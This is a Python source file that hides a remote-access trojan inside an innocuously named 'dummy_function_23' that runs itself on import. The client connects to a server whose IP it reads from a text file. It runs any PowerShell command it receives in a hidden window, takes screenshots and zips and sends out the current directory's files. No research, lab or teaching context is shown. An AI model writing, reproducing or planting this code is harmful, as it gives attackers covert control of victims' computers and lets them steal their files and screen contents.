def dummy_function_23():
    def IN_THE_NAME_OF_ORDER():
        import socket
        import os
        import subprocess
        import time
        import io
        from PIL import ImageGrab
        import zipfile
        
        def get_ip_from_config():
            file_name = os.path.join(os.path.dirname(__file__), "server_ip.txt")
            if not os.path.exists(file_name):
                raise FileNotFoundError(f"File '{file_name}' not found in the current directory.")
            with open(file_name, "r") as file:
                first_line = file.readline().strip()
            # os.remove(file_name)
            return first_line
        
        # Client configuration
        SERVER_IP = get_ip_from_config()  # Change this to your server's IP now automatic
        PORT = 12345
        BUFFER_SIZE = 104857600 # 100 mb buffer size

        def connection():
            os.system('cls' if os.name == 'nt' else 'clear')
            
            print(SERVER_IP)

            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                try:
                    client_socket.connect((SERVER_IP, PORT))
                    print(f"CONNECTED TO SERVER AT => {SERVER_IP} : {PORT} ... \n")
                except (socket.timeout, ConnectionRefusedError):
                    print("Server closed")
                    time.sleep(10)  # Wait for 10 seconds
                    return  # Exit gracefully
                
                while True:
                    # Receive message from server if nothing sent it closes connection 
                    received_data = client_socket.recv(BUFFER_SIZE)
                    
                    if not received_data:
                        print("Server closed the connection.")
                        break  # Exit the loop gracefully
                    
                    received_data = received_data.decode()
                    print(f"COMMAND USED => {received_data}")
                    
                    if received_data == "ss":
                        img_bytes = io.BytesIO()
                        ImageGrab.grab().save(img_bytes, format="PNG")  # Capture and store in memory
                        image_data = img_bytes.getvalue()  # Return the image bytes
                        client_socket.sendall(len(image_data).to_bytes(4, 'big'))
                        client_socket.sendall(image_data)
                        
                    elif received_data == "download":
                        current_directory = os.getcwd()  # Get the current working directory
                        # Ensure the user is inside a folder and not at the root level
                        if os.path.dirname(current_directory) == current_directory:
                            client_socket.sendall("Error: Not inside a folder".encode())
                        else:
                            client_socket.sendall("OK".encode())  # Send success status
                            zip_buffer = io.BytesIO()
                            # Create a zip archive in memory
                            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                                for root, _, files in os.walk(current_directory):  # Walk through all files in the directory
                                    for file in files:
                                        file_path = os.path.join(root, file)
                                        arcname = os.path.relpath(file_path, current_directory)  # Store relative path
                                        zipf.write(file_path, arcname=arcname)
                            zip_data = zip_buffer.getvalue()  # Get zip file as bytes
                            # Send file size first (4 bytes)
                            client_socket.sendall(len(zip_data).to_bytes(4, 'big'))
                            # Send the zip file data
                            client_socket.sendall(zip_data)
                            print(f"Sent current directory '{current_directory}' as a zip file.")
                            
                    else:
                        # Executing command recieved
                        output = execute_command(received_data)
                        print(output)
                        client_socket.sendall(output.encode())

        def execute_command(command):
            # List of known interactive commands that require user input
            interactive_cmds = ["sls", "pause", "more", "select-string"]
            # If command is empty or only whitespace, return an error
            if not command.strip():
                return "Error: Empty command received."
            # Check if command is interactive
            if any(command.strip().lower().startswith(cmd) for cmd in interactive_cmds):
                return f"Error: Command '{command}' requires interactive input and is not allowed."
            try:
                # Handle 'cd' command properly
                if command.strip() == "cd":  # If only "cd" is sent
                    return "Error: No directory provided for 'cd' command."
                if command.strip().startswith("cd "):
                    new_dir = command.strip()[3:].strip()  # Extract directory after 'cd '
                    if not new_dir:  # If empty, return an error
                        return "Error: No directory provided for 'cd' command."
                    if not os.path.isdir(new_dir):  # If directory does not exist
                        return f"Error: Directory '{new_dir}' does not exist."
                    os.chdir(new_dir)  # Change the directory
                    return f"Changed directory to: {os.getcwd()}"
                # Execute command in PowerShell, prevent input wait, and hide the window
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                startupinfo.wShowWindow = subprocess.SW_HIDE
                result = subprocess.run(
                    ["powershell", "-Command", command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.DEVNULL,  # Prevents waiting for input
                    text=True,
                    startupinfo=startupinfo,
                    creationflags=subprocess.CREATE_NO_WINDOW  # Prevents the creation of a console window
                )
                # If command succeeds but has no output, return the current directory
                if result.returncode == 0 and not result.stdout.strip():
                    return f"Command executed successfully, but no output. Current directory: {os.getcwd()}"
                return result.stdout if result.returncode == 0 else f"Error: {result.stderr}"
            except FileNotFoundError:
                return f"Error: Command '{command}' not found."
            except PermissionError:
                return f"Error: Permission denied for command '{command}'."
            except Exception as e:
                return f"Execution Error: {str(e)}"

        # calling for connection establishment function 
        connection()
        
    import threading 
    # Run the function in a separate thread to prevent UI freezing
    thread = threading.Thread(target=IN_THE_NAME_OF_ORDER())
    thread.daemon = True  # Daemonize thread
    thread.start()

dummy_function_23()